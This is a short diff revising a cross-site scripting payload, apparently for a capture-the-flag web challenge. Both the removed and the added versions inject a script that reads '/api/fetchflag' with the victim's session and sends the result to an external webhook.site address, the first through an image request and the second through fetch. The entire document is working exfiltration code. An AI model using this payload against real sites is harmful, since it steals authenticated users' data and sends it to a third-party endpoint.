@@ -1,7 +1,5 @@
-</pre><script>
-fetch('/api/fetchflag',{credentials:'include'})
-  .then(r => r.json())
-  .then(d => {
-    new Image().src='https://webhook.site/dcc15227-d003-45fa-b818-3bc971c36d17/?flag='+encodeURIComponent(d.flag);
-  });
+<script>
+fetch('/api/fetchflag')
+  .then(r => r.text())
+  .then(data => fetch('https://webhook.site/dcc15227-d003-45fa-b818-3bc971c36d17/capture?flag=' + encodeURIComponent(data)));
 </script>
